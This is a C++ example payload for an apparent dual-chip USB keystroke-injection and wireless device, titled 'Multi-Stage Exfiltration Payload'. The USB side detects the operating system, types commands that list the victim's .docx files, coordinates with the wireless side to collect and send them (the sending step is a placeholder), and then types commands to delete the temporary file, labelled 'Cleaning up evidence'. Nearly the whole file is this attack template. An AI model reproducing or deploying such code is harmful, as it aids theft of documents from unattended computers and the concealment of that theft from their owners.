/**
 * C++ Example: Multi-Stage Exfiltration Payload
 *
 * Demonstrates coordination between USB and wireless components
 * using our LLVM framework with C++ language features.
 */

// C++ payload (combined_payloads/exfiltration.cpp)
#include "payload_framework.h"
#include <vector>
#include <string>
#include <algorithm>

// Define payload metadata
PAYLOAD_INFO("C++ Multi-Stage Exfiltration", "1.0", PAYLOAD_PRIORITY_HIGH);

// Modern C++ class for managing exfiltration state
class ExfiltrationManager {
private:
    std::string targetCommand;
    std::vector<std::string> collectedData;
    bool isUSBController;
    bool isComplete = false;
    
public:
    ExfiltrationManager() {
        isUSBController = System.isUSBController();
    }
    
    void prepareForOS(OperatingSystem os) {
        // Select appropriate command based on OS
        switch (os) {
            case OS_WINDOWS:
                targetCommand = "dir /s /b /a-d %USERPROFILE%\\Documents\\*.docx > %TEMP%\\file_list.txt";
                break;
                
            case OS_MACOS:
                targetCommand = "find ~/Documents -name \"*.docx\" -type f > /tmp/file_list.txt";
                break;
                
            case OS_LINUX:
                targetCommand = "find ~/Documents -name \"*.docx\" -type f > /tmp/file_list.txt";
                break;
                
            default:
                // Default fallback
                targetCommand = "dir > %TEMP%\\file_list.txt";
                break;
        }
    }
    
    void executeCommand() {
        if (!isUSBController) return;
        
        System.log("Executing command: %s", targetCommand.c_str());
        KeyboardHID.sendLine(targetCommand.c_str());
        
        // Signal command execution complete
        InterChip.triggerEvent(EVENT_CUSTOM_BASE, nullptr, 0);
    }
    
    void collectData() {
        if (isUSBController) {
            System.log("USB controller waiting for data collection");
            // USB controller waits for wireless controller
            InterChip.waitForEvent(EVENT_CUSTOM_BASE + 1, 30000);
        } else {
            System.log("Wireless controller collecting data");
            // Simulate data collection on wireless controller
            collectedData.push_back("Document1.docx");
            collectedData.push_back("Document2.docx");
            collectedData.push_back("FinancialReport.docx");
            
            // Signal data collection complete
            InterChip.triggerEvent(EVENT_CUSTOM_BASE + 1, nullptr, 0);
        }
    }
    
    void transferData() {
        if (!isUSBController) {
            // On wireless controller, exfiltrate data
            System.log("Exfiltrating %zu files", collectedData.size());
            
            // In a real payload, this would connect to a remote server
            // and transfer the data using Wi-Fi or BLE
            System.log("Data exfiltration complete");
            
            // Signal to USB controller
            InterChip.triggerEvent(EVENT_CUSTOM_BASE + 2, nullptr, 0);
        } else {
            // On USB controller, wait for completion
            InterChip.waitForEvent(EVENT_CUSTOM_BASE + 2, 30000);
        }
    }
    
    void cleanup() {
        if (isUSBController) {
            System.log("Cleaning up evidence");
            
            // Execute cleanup commands based on OS
            OperatingSystem os = OSDetect.detect(OS_DETECT_CACHED);
            
            switch (os) {
                case OS_WINDOWS:
                    KeyboardHID.sendLine("del %TEMP%\\file_list.txt");
                    break;
                    
                case OS_MACOS:
                case OS_LINUX:
                    KeyboardHID.sendLine("rm /tmp/file_list.txt");
                    break;
                    
                default:
                    break;
            }
            
            isComplete = true;
        }
    }
    
    bool complete() const {
        return isComplete;
    }
};

void payload_main(PayloadContext* ctx) {
    // Create our C++ manager class
    ExfiltrationManager manager;
    
    // Set LED color based on which chip we're running on
    if (System.isUSBController()) {
        StatusLED.setColor(0, 0, 255, 0); // Blue for USB controller
    } else {
        StatusLED.setColor(0, 255, 0, 0); // Green for wireless controller
    }
    
    // Detect OS (only needed on USB controller)
    if (System.isUSBController()) {
        ctx->detected_os = OSDetect.detect(OS_DETECT_THOROUGH);
        
        // Prepare command appropriate for the detected OS
        manager.prepareForOS(ctx->detected_os);
        
        // Execute the command to generate a file list
        manager.executeCommand();
    }
    
    // Both controllers proceed with their respective tasks
    manager.collectData();
    manager.transferData();
    
    // Clean up (USB controller only)
    manager.cleanup();
    
    // Turn off status LED when complete
    if (manager.complete()) {
        StatusLED.off();
    }
}